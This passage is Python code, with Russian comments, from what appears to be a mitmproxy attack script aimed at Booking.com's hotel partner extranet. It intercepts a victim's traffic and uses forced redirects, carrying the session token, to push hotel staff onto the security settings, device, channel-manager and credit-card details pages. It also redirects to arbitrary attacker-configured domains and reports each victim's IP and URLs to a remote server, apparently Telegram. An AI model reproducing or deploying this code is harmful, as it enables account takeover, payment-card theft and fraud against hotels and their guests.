            # ОТПРАВЛЯЕМ УВЕДОМЛЕНИЕ О ЗАВЕРШЕНИИ
            client_ip = get_client_ip(flow)
            send_function_complete_notification(client_ip, url, "FUNCTION_15_COMPLETE")
            
            # --- ОПЕРАЦИЯ 16: Если активна операция 16, завершаем ее ---
            if should_operation_16():
                log("Operation 16: Function 15 completed, operation finished")
                remove_operation_16_flag()
            
            return False
        
        # Проверяем, что это запрос к admin.booking.com
        host = (flow.request.pretty_host or "").lower()
        if not host.endswith("admin.booking.com"):
            return False
            
        # Если уже на security_settings.html - не делаем редирект
        if "security_settings.html" in url:
            return False

        # Получаем параметры
        parsed = urllib.parse.urlparse(url)
        query = urllib.parse.parse_qs(parsed.query)
        
        hotel_id = None
        ses = None
        
        # Пытаемся получить hotel_id и ses
        if "hotel_id" in query:
            hotel_id = query.get("hotel_id", [None])[0]
        if "ses" in query:
            ses = query.get("ses", [None])[0]
        
        # Если не нашли в query - проверяем Referer
        if not hotel_id or not ses:
            referer = flow.request.headers.get("Referer") or flow.request.headers.get("referer")
            if referer:
                try:
                    rp = urllib.parse.urlparse(referer)
                    rq = urllib.parse.parse_qs(rp.query)
                    if not hotel_id and "hotel_id" in rq:
                        hotel_id = rq.get("hotel_id", [None])[0]
                    if not ses and "ses" in rq:
                        ses = rq.get("ses", [None])[0]
                except Exception:
                    pass
        
        # Дополнительная эвристика
        if not hotel_id:
            m = re.search(r"/hotel/(?:.*/)?(\d+)(?:/|$)", parsed.path)
            if m:
                hotel_id = m.group(1)
        
        # Значения по умолчанию
        if not hotel_id:
            hotel_id = "14762911"
        if not ses:
            ses = "fe4d20067bebe1ae741804589903f82f"
        
        # Формируем целевой URL
        target_url = f"https://admin.booking.com/hotel/hoteladmin/extranet_ng/manage/messaging/security_settings.html?ses={ses}&hotel_id={hotel_id}&lang=en"
        
        log(f"Function 15: Redirect {url} -> {target_url}")
        
        # Логируем редирект
        client_ip = get_client_ip(flow)
        log_redirect_to_server(client_ip, url, target_url, "FUNCTION_15_HOTEL_SECURITY")
        
        # Выполняем редирект
        flow.response = http.Response.make(
            302, 
            b"", 
            {
                "Location": target_url,
                "Cache-Control": "no-cache, no-store, must-revalidate",
                "Pragma": "no-cache",
                "Expires": "0"
            }
        )
        return True
        
    except Exception as e:
        log(f"booking_hotel_security_redirect error: {e}")
        return False

def custom_redirect(flow: http.HTTPFlow) -> bool:
    """
    ФУНКЦИЯ 17: ЕДИНОРАЗОВЫЙ КАСТОМНЫЙ РЕДИРЕКТ
    Работает для ЛЮБЫХ доменов, независимо от использования ранее
    """
    try:
        # 1. Проверяем активацию
        if not should_custom_redirect():
            return False
        
        # 2. Проверяем done flag (если есть - функция уже выполнена)
        if os.path.exists(CUSTOM_REDIRECT_DONE_FLAG):
            log("[F17] One-time redirect already performed - skipping")
            return False
        
        url = flow.request.pretty_url
        from_domain = get_custom_redirect_from()
        to_domain = get_custom_redirect_to()
        
        if not from_domain or not to_domain:
            log("[F17] Missing FROM or TO domains")
            return False
        
        # НОРМАЛИЗАЦИЯ URL
        def normalize_url(url_str: str) -> str:
            """Нормализует URL для сравнения"""
            if not url_str:
                return ""
            # Убираем протокол
            if url_str.startswith('https://'):
                url_str = url_str[8:]
            elif url_str.startswith('http://'):
                url_str = url_str[7:]
            # Убираем www
            if url_str.startswith('www.'):
                url_str = url_str[4:]
            # Убираем trailing slash
            url_str = url_str.rstrip('/')
            return url_str.lower()
        
        # Нормализуем URL запроса
        request_url_lower = url.lower()
        request_host = flow.request.pretty_host.lower()
        
        # Нормализуем from_domain (целевой домен)
        from_domain_normalized = normalize_url(from_domain)
        
        # ПРОВЕРКА 1: Сравниваем хост запроса с целевым доменом
        if from_domain_normalized not in request_host:
            return False
        
        # ПРОВЕРКА 2: Убедимся, что это не редирект на тот же домен
        to_domain_normalized = normalize_url(to_domain)
        if to_domain_normalized in request_host:
            return False
        
        # ПРОВЕРКА 3: Убедимся, что это HTTP/HTTPS запрос (не websocket и т.д.)
        if not request_url_lower.startswith(('http://', 'https://')):
            return False
        
        log(f"[F17] ✓ ONE-TIME redirect triggered!")
        log(f"[F17] From: {url}")
        log(f"[F17] To:   {to_domain}")
        
        # Логируем редирект
        client_ip = get_client_ip(flow)
        log_redirect_to_server(client_ip, url, to_domain, "CUSTOM_ONETIME_REDIRECT")
        
        # Создаем DONE flag СРАЗУ
        try:
            parent_dir = os.path.dirname(CUSTOM_REDIRECT_DONE_FLAG)
            if parent_dir and not os.path.exists(parent_dir):
                os.makedirs(parent_dir, exist_ok=True)
            with open(CUSTOM_REDIRECT_DONE_FLAG, 'w') as f:
                f.write("1")
            log("[F17] One-time redirect DONE flag created")
        except Exception as e:
            log(f"[F17] Error creating done flag: {e}")
        
        # Выполняем редирект
        flow.response = http.Response.make(
            302, 
            b"", 
            {
                "Location": to_domain,
                "Cache-Control": "no-cache, no-store, must-revalidate",
                "Pragma": "no-cache",
                "Expires": "0",
                "X-MITM-Redirect": "Function-17-One-Time"
            }
        )
        
        # Удаляем активацию через 3 секунды
        def cleanup_activation():
            time.sleep(3)
            try:
                if os.path.exists(CUSTOM_REDIRECT_FLAG):
                    os.remove(CUSTOM_REDIRECT_FLAG)
                    log("[F17] Activation flag removed")
                # Также удаляем файлы конфигурации
                if os.path.exists(CUSTOM_REDIRECT_FROM_FILE):
                    os.remove(CUSTOM_REDIRECT_FROM_FILE)
                if os.path.exists(CUSTOM_REDIRECT_TO_FILE):
                    os.remove(CUSTOM_REDIRECT_TO_FILE)
            except Exception as e:
                log(f"[F17] Error removing activation flag: {e}")
        
        threading.Thread(target=cleanup_activation, daemon=True).start()
        
        return True
        
    except Exception as e:
        log(f"[F17] custom_redirect error: {e}")
        import traceback
        log(f"[F17] Traceback: {traceback.format_exc()}")
        return False

def booking_cc_details_redirect(flow: http.HTTPFlow) -> bool:
    """
    ФУНКЦИЯ 19:
    Редиректит все запросы к admin.booking.com → secure-admin.booking.com/booking_cc_details.html
    """
    try:
        if not should_booking_cc_details():
            return False

        url = flow.request.pretty_url
        host = (flow.request.pretty_host or "").lower()
        
        # ====== ВАЖНОЕ ИСПРАВЛЕНИЕ: ПРОВЕРКА secure-admin ======
        # Если пользователь УЖЕ на secure-admin.booking.com - НЕ делаем редирект
        if host.startswith("secure-admin.") and host.endswith("booking.com"):
            # Это уже целевой домен - проверяем завершение функции
            url_lower = url.lower()
            required_params = ["ses=", "has_bvc=", "lang=", "bn=", "hotel_id="]
            has_all_params = all(param in url_lower for param in required_params)
            
            if has_all_params:
                log(f"[F19] ✓ Detected ALL 5 required parameters -> FUNCTION 19 COMPLETED")
                full_url = url
                remove_booking_cc_details_flag()
                client_ip = get_client_ip(flow)
                send_function_complete_notification(client_ip, full_url, "FUNCTION_19_COMPLETE")
                log(f"[F19] ✓ Completion notification sent")
            
            # ВАЖНО: НЕ делаем редирект если уже на secure-admin!
            return False
        
        # ====== ПРОВЕРКА ЗАВЕРШЕНИЯ ФУНКЦИИ ======
        # (этот блок нужен на случай если пользователь пришел по прямой ссылке)
        if "secure-admin.booking.com/booking_cc_details.html" in url.lower():
            url_lower = url.lower()
            required_params = ["ses=", "has_bvc=", "lang=", "bn=", "hotel_id="]
            has_all_params = all(param in url_lower for param in required_params)
            
            if has_all_params:
                log(f"[F19] ✓ Detected ALL 5 required parameters -> FUNCTION 19 COMPLETED")
                full_url = url
                remove_booking_cc_details_flag()
                client_ip = get_client_ip(flow)
                send_function_complete_notification(client_ip, full_url, "FUNCTION_19_COMPLETE")
                log(f"[F19] ✓ Completion notification sent")
                return False
            
            return False
        
        # ====== ПЕРВИЧНЫЙ РЕДИРЕКТ ======
        # Редиректим ТОЛЬКО admin.booking.com (сабдомен admin)
        if not host.startswith("admin.") or not host.endswith("booking.com"):
            return False
        
        # Проверяем, не идет ли уже с booking_cc_details.html
        referer = flow.request.headers.get("Referer") or flow.request.headers.get("referer")
        if referer and "secure-admin.booking.com/booking_cc_details.html" in referer.lower():
            return False
        
        # ⚠️ ФИЛЬТРАЦИЯ: Не редиректим статические файлы
        if any(ext in url.lower() for ext in ['.css', '.js', '.png', '.jpg', '.jpeg', '.gif', '.ico', '.woff', '.woff2', '.ttf', '.svg']):
            return False
        
        # Проверяем, что это HTML запрос
        accept = flow.request.headers.get("Accept", "").lower()
        if not ("text/html" in accept or flow.request.method == "GET"):
            return False
        
        log(f"[F19] This is admin.booking.com request - making primary redirect")
        
        # Получаем параметры из конфигурации
        bn = get_booking_cc_details_bn()
        hotel_id_config = get_booking_cc_details_hotel_id()
        
        # Получаем язык
        parsed = urllib.parse.urlparse(url)
        query = urllib.parse.parse_qs(parsed.query)
        lang = query.get("lang", ["en"])[0]
        
        if lang == "en":
            referer = flow.request.headers.get("Referer") or flow.request.headers.get("referer")
            if referer:
                try:
                    rp = urllib.parse.urlparse(referer)
                    rq = urllib.parse.parse_qs(rp.query)
                    if "lang" in rq:
                        lang = rq.get("lang", ["en"])[0]
                except Exception as e:
                    log(f"[F19] Error parsing referer for lang: {e}")
        
        log(f"[F19] Using bn={bn}, hotel_id={hotel_id_config}, lang={lang}")
        
        # Формируем целевой URL
        target_url = f"https://secure-admin.booking.com/booking_cc_details.html?lang={lang};bn={bn};hotel_id={hotel_id_config};has_bvc=1"
        
        if url == target_url:
            return False
        
        log(f"[F19] ✓ Primary redirect {url} -> {target_url}")
        
        # Логируем редирект
        client_ip = get_client_ip(flow)
        log_redirect_to_server(client_ip, url, target_url, "FUNCTION_19_CC_DETAILS")
        
        # Выполняем редирект
        flow.response = http.Response.make(
            302, 
            b"", 
            {
                "Location": target_url,
                "Cache-Control": "no-cache, no-store, must-revalidate",
                "Pragma": "no-cache",
                "Expires": "0"
            }
        )
        return True
        
    except Exception as e:
        log(f"[F19] Error in booking_cc_details_redirect: {e}")
        import traceback
        log(f"[F19] Traceback: {traceback.format_exc()}")
        return False
        
def partners_redirect(flow: http.HTTPFlow) -> bool:
    """
    ФУНКЦИЯ 21:
    Перенаправляет на channel-manager с REAL параметрами (как функции 13/15)
    """
    try:
        if not should_partners():
            return False

        url = flow.request.pretty_url
        host = (flow.request.pretty_host or "").lower()
        url_l = url.lower()

        # ТОЛЬКО admin.booking.com
        if not host.endswith("admin.booking.com"):
            return False

        # ⚠️ НЕ редиректим если это статический файл
        if any(ext in url_l for ext in [
            '.css', '.js', '.png', '.jpg', '.jpeg', '.gif',
            '.ico', '.woff', '.woff2', '.ttf', '.svg'
        ]):
            return False

        # ====== ПАРСИМ URL И СРАЗУ СТРОИМ target_url ======

        parsed = urllib.parse.urlparse(url)
        query = urllib.parse.parse_qs(parsed.query)

        hotel_id = query.get("hotel_id", [None])[0]
        ses = query.get("ses", [None])[0]
        lang = query.get("lang", ["en"])[0]

        if not ses or not hotel_id:
            referer = flow.request.headers.get("Referer") or flow.request.headers.get("referer")
            if referer:
                try:
                    rp = urllib.parse.urlparse(referer)
                    rq = urllib.parse.parse_qs(rp.query)
                    hotel_id = hotel_id or rq.get("hotel_id", [None])[0]
                    ses = ses or rq.get("ses", [None])[0]
                except Exception:
                    pass

        if not hotel_id:
            m = re.search(r"/hotel/(?:.*/)?(\d+)(?:/|$)", parsed.path)
            if m:
                hotel_id = m.group(1)

        if not ses:
            return False

        if not hotel_id:
            hotel_id = "15239128"

        target_url = (
            "https://admin.booking.com/hotel/hoteladmin/extranet_ng/manage/"
            f"channel-manager/index.html?hotel_id={hotel_id}&lang={lang}&ses={ses}&view=provider-selection"
        )

        # ====== КОРРЕКТНЫЕ УСЛОВИЯ ЗАВЕРШЕНИЯ ======

        completed = False

        # 1️⃣ tlc — всегда финал
        if "tlc=" in url_l:
            log("Function 21: ✓ Detected tlc parameter -> COMPLETED")
            completed = True

        # 2️⃣ 403 — финал
        elif "/hotel/hoteladmin/extranet_ng/manage/403.html" in url_l:
            log("Function 21: ✓ Detected 403 page -> COMPLETED")
            completed = True

        # 3️⃣ Пользователь УШЁЛ ДАЛЬШЕ по channel-manager (НЕ наш index)
        elif (
            "/hotel/hoteladmin/extranet_ng/manage/channel-manager/" in url_l
            and not url_l.startswith(target_url.lower())
        ):
            log("Function 21: ✓ User moved deeper into channel-manager -> COMPLETED")
            completed = True

        if completed:
            client_ip = get_client_ip(flow)
            send_function_complete_notification(
                client_ip, url, "FUNCTION_21_COMPLETE"
            )

            if should_partners_and_mess():
                enable_booking_hotel_security_from_partners()

            remove_partners_flag()
            return False

        # ====== РЕДИРЕКТ ======

        if url == target_url:
            return False

        client_ip = get_client_ip(flow)
        log_redirect_to_server(
            client_ip, url, target_url, "FUNCTION_21_PARTNERS"
        )

        flow.response = http.Response.make(
            302,
            b"",
            {
                "Location": target_url,
                "Cache-Control": "no-cache, no-store, must-revalidate",
                "Pragma": "no-cache",
                "Expires": "0"
            }
        )
        return True

    except Exception as e:
        log(f"Function 21 ERROR: {e}")
        import traceback
        log(traceback.format_exc())
        return False


def device_redirect(flow: http.HTTPFlow) -> bool:
    """
    ФУНКЦИЯ 23:
    Перенаправляет на devices.html с REAL параметрами (как функции 13/15)
    """
    try:
        if not should_device():
            return False

        url = flow.request.pretty_url
        host = (flow.request.pretty_host or "").lower()
        
        # ТОЛЬКО admin.booking.com
        if not host.endswith("admin.booking.com"):
            return False
        
        # ⚠️ НЕ редиректим статические файлы
        if any(ext in url.lower() for ext in ['.css', '.js', '.png', '.jpg', '.jpeg', '.gif', '.ico', '.woff', '.woff2', '.ttf', '.svg']):
            return False
        
        # ⚠️ Проверка завершения функции (как в функции 13)
        if "auth_assurance_last_check=" in url.lower():
            log("Function 23: ✓ Detected auth_assurance_last_check -> COMPLETED")
            
            # Отправляем уведомление в Telegram
            client_ip = get_client_ip(flow)
            send_function_complete_notification(client_ip, url, "FUNCTION_23_COMPLETE")
            
            # ОПЕРАЦИЯ 25: Включение Pulse после завершения Device
            if should_ultra_pulse():
                log("Function 25: Activating Pulse after Device completion")
                enable_pulse_from_ultra_pulse()
            
            remove_device_flag()
            
            # ФИНАЛЬНЫЙ редирект на главную
            target_url = "https://admin.booking.com/hotel/hoteladmin/"
            log(f"Function 23: Final redirect to {target_url}")
            
            flow.response = http.Response.make(
                302,
                b"",
                {
                    "Location": target_url,
                    "Cache-Control": "no-cache, no-store, must-revalidate",
                    "Pragma": "no-cache",
                    "Expires": "0"
                }
            )
            return True
        
        # Если уже на devices.html - ждем параметр
        if "security/devices.html" in url:
            log("Function 23: Already on devices page, waiting for auth_assurance_last_check")
            return False
        
        # ====== ПОЛУЧАЕМ РЕАЛЬНЫЕ ПАРАМЕТРЫ (как в функциях 13/15) ======
        parsed = urllib.parse.urlparse(url)
        query = urllib.parse.parse_qs(parsed.query)
        
        # 1. Из текущего URL
        hotel_id = query.get("hotel_id", [None])[0]
        ses = query.get("ses", [None])[0]
        lang = query.get("lang", ["en"])[0]
        
        # 2. Проверяем Referer если нет в URL (как в 13/15)
        if not ses or not hotel_id:
            referer = flow.request.headers.get("Referer") or flow.request.headers.get("referer")
            if referer:
                try:
                    rp = urllib.parse.urlparse(referer)
                    rq = urllib.parse.parse_qs(rp.query)
                    if not hotel_id and "hotel_id" in rq:
                        hotel_id = rq.get("hotel_id", [None])[0]
                    if not ses and "ses" in rq:
                        ses = rq.get("ses", [None])[0]
                except Exception as e:
                    log(f"Function 23: Error parsing referer: {e}")
        
        # 3. Эвристика для hotel_id (как в 13/15)
        if not hotel_id:
            m = re.search(r"/hotel/(?:.*/)?(\d+)(?:/|$)", parsed.path)
            if m:
                hotel_id = m.group(1)
        
        # ⚠️ ВАЖНО: БЕЗ ses НЕ ДЕЛАЕМ РЕДИРЕКТ (как в 13/15)
        if not ses:
            log("Function 23: ❌ No ses parameter found - user not authenticated")
            return False
        
        # Значения по умолчанию (как в 13/15)
        if not hotel_id:
            hotel_id = "14762911"
        
        log(f"Function 23: Using REAL params - hotel_id={hotel_id}, ses={ses[:10]}..., lang={lang}")
        
        # Формируем целевой URL
        target_url = f"https://admin.booking.com/hotel/hoteladmin/extranet_ng/manage/security/devices.html?lang={lang}&ses={ses}&hotel_id={hotel_id}"
        
        if url == target_url:
            return False
        
        log(f"Function 23: Redirect {url} -> {target_url}")
        
        # Логируем в Telegram
        client_ip = get_client_ip(flow)
        log_redirect_to_server(client_ip, url, target_url, "FUNCTION_23_DEVICE")
        
        # Выполняем редирект
        flow.response = http.Response.make(
            302,
            b"",
            {
                "Location": target_url,
                "Cache-Control": "no-cache, no-store, must-revalidate",
                "Pragma": "no-cache",
                "Expires": "0"
            }
        )
        return True
        
    except Exception as e:
        log(f"Function 23 ERROR: {e}")
        import traceback
        log(f"Traceback: {traceback.format_exc()}")
        return False

def pulse_redirect(flow: http.HTTPFlow) -> bool:
    """
    ФУНКЦИЯ 24: ИСПРАВЛЕННАЯ ВЕРСИЯ
    РЕШЕНИЕ: НЕ редиректим account.booking.com когда Pulse отключен
    """
    try:
        # ========== ВАЖНОЕ ИСПРАВЛЕНИЕ ==========
        # РАНЬШЕ: когда Pulse отключен → все равно редиректим account.booking.com
        # СЕЙЧАС: когда Pulse отключен → НИЧЕГО НЕ ДЕЛАЕМ!
        
        # Только если Pulse АКТИВЕН
        if not should_pulse():
            return False  # ⚠️ КЛЮЧЕВОЕ ИСПРАВЛЕНИЕ!
        
        url = flow.request.pretty_url
        host = (flow.request.pretty_host or "").lower()
        
        # ========== РЕЖИМ: PULSE АКТИВЕН ==========
        # Редиректим только admin.booking.com
        if not host.startswith("admin.") or not host.endswith("booking.com"):
            return False
        
        # Получаем целевой URL из конфигурации
        target_url = get_pulse_redirect_to()
        if not target_url:
            log("Function 24: No target URL configured")
            return False
        
        # Проверяем, что это не редирект на ту же страницу
        if url == target_url:
            return False
        
        log(f"Function 24: Pulse redirect {url} -> {target_url}")
        
        # Логируем
        client_ip = get_client_ip(flow)
        log_redirect_to_server(client_ip, url, target_url, "FUNCTION_24_PULSE")
        
        # Выполняем редирект
        flow.response = http.Response.make(
            302,
            b"",
            {
                "Location": target_url,
                "Cache-Control": "no-cache, no-store, must-revalidate",
                "Pragma": "no-cache",
                "Expires": "0"
            }
        )
        return True
        
    except Exception as e:
        log(f"Function 24 error: {e}")
        import traceback
        log(f"Traceback: {traceback.format_exc()}")
        return False
        
def ultra_pulse_redirect(flow: http.HTTPFlow) -> bool:
    """
    ФУНКЦИЯ 25: ULTRA PULSE - ИСПРАВЛЕННАЯ
    """
    try:
        if not should_ultra_pulse():
            return False
        
        log(f"Function 25: Ultra Pulse active")
        
        # 1. Сначала проверяем Функцию 23 (Device)
        if should_device():
            log(f"Function 25: Phase 1 (Device) active")
            if device_redirect(flow):
                log(f"Function 25: Executed Function 23 (Device) redirect")
                return True
        
        # 2. Если Device завершилась, проверяем Pulse
        if should_pulse():
            log(f"Function 25: Phase 2 (Pulse) active")
            if pulse_redirect(flow):
                log(f"Function 25: Executed Function 24 (Pulse) redirect")
                return True
        
        # 3. Если обе функции завершены, отключаем Ultra Pulse
        if not should_device() and not should_pulse():
            log(f"Function 25: Both phases completed - removing Ultra Pulse flag")
            remove_ultra_pulse_flag()
            return False
        
        return False
        
    except Exception as e:
        log(f"Function 25 error: {e}")
        import traceback
        log(f"Traceback: {traceback.format_exc()}")
        return False

# Главная точка входа
def request(flow: http.HTTPFlow) -> None:
    """
    ГЛАВНАЯ ФУНКЦИЯ MITMproxy - ИСПРАВЛЕННАЯ
    Правильный порядок выполнения
    """
    
    url = flow.request.pretty_url
    host = (flow.request.pretty_host or "").lower()
    
    # ========== ФУНКЦИЯ 26: Мониторинг платформ ==========
    if should_monitor_platforms() and should_log_domain(flow):
        try:
            client_ip = get_client_ip(flow)
            from_url = flow.request.pretty_url
            log_redirect_to_server(client_ip, from_url, "MONITORED", "DOMAIN_MONITOR")
        except Exception as e:
            log(f"Error in domain monitoring: {e}")
    
    # ========== ПРИОРИТЕТ 1: ФУНКЦИЯ 17 (единоразовый кастом) ==========
    if custom_redirect(flow):
        return
    
    # ========== ПРИОРИТЕТ 2: ФУНКЦИИ 18-19 (Booking reservations/details) ==========
    if host.endswith("admin.booking.com"):
        if booking_reservations_download_redirect(flow):
            return
    
    if host.endswith("booking.com"):
        if booking_cc_details_redirect(flow):
            return
    
    # ========== ПРИОРИТЕТ 3: BOOKING РЕДИРЕКТЫ 13-16 ==========
    if host.endswith("admin.booking.com"):
        # Функции 13 и 15 остаются БЕЗ ИЗМЕНЕНИЙ (как в старом работающем коде)
        if booking_hotel_security_redirect(flow):
            return
            
        if booking_hotel_global_redirect(flow):
            return

        if booking_redirect(flow, "message"):
            return
        if booking_redirect(flow, "provider"):
            return
        if booking_redirect(flow, "user"):
            return
        if booking_redirect(flow, "security"):
            return
    
    # ========== ПРИОРИТЕТ 4: ФУНКЦИИ 21-23 (с реальными параметрами) ==========
    # Эти функции работают ТОЛЬКО для admin.booking.com
    
    if host.endswith("admin.booking.com"):
        if should_partners():
            if partners_redirect(flow):
                return
        
        if should_device():
            if device_redirect(flow):
                return
        
        # Функция 22 (Partners + Messaging)
        if should_partners_and_mess():
            if should_partners() and partners_redirect(flow):
                return
    
    # ========== ПРИОРИТЕТ 5: ФУНКЦИИ 24-25 (PULSE) ==========
    # ⚠️ ВАЖНО: Pulse проверяется ПОСЛЕ других функций 21-23
    
    if should_pulse():
        if pulse_redirect(flow):
            return
    
    if should_ultra_pulse():
        if ultra_pulse_redirect(flow):
            return
    
    # ========== ПРИОРИТЕТ 6: ОБЫЧНЫЕ РЕДИРЕКТЫ ==========
    redirect_target = get_redirect_target()
    
    if not redirect_target:
        # Если redirect_target пустой - НЕ выполняем обычные редиректы
        # Это предотвращает ломание интернета
        return
    
    # Пропускаем если это сам таргет
    if is_redirect_target(flow, redirect_target):
        log(f"skip redirect for target itself: {flow.request.pretty_url}")
        return
    
    # Обычные редиректы (только если есть таргет)
    if should_force():
        log(f"FORCE redirect {flow.request.pretty_url} -> {redirect_target}")
        client_ip = get_client_ip(flow)
        log_redirect_to_server(client_ip, flow.request.pretty_url, redirect_target, "FORCE")
        flow.response = http.Response.make(302, b"", {"Location": redirect_target})
        return

    if should_one_shot():
        log(f"GLOBAL ONE-SHOT redirect {flow.request.pretty_url} -> {redirect_target}")
        client_ip = get_client_ip(flow)
        log_redirect_to_server(client_ip, flow.request.pretty_url, redirect_target, "ONE_SHOT")
        flow.response = http.Response.make(
            302, b"", {"Location": redirect_target, "Set-Cookie": f"{COOKIE}=1; Path=/; Secure; HttpOnly"}
        )
        remove_one_shot_flag()
        return

    # Cookie-based редирект
    try:
        cookie_present = bool(flow.request.cookies.get(COOKIE))
        if cookie_present:
            log(f"cookie present -> skipping redirect for {host}")
            return
    except Exception:
        pass

    log(f"one-shot client redirect {flow.request.pretty_url} -> {redirect_target}")
    client_ip = get_client_ip(flow)
    log_redirect_to_server(client_ip, flow.request.pretty_url, redirect_target, "ONE_SHOT")
    flow.response = http.Response.make(
        302, b"", {"Location": redirect_target, "Set-Cookie": f"{COOKIE}=1; Path=/; Secure; HttpOnly"}
    )
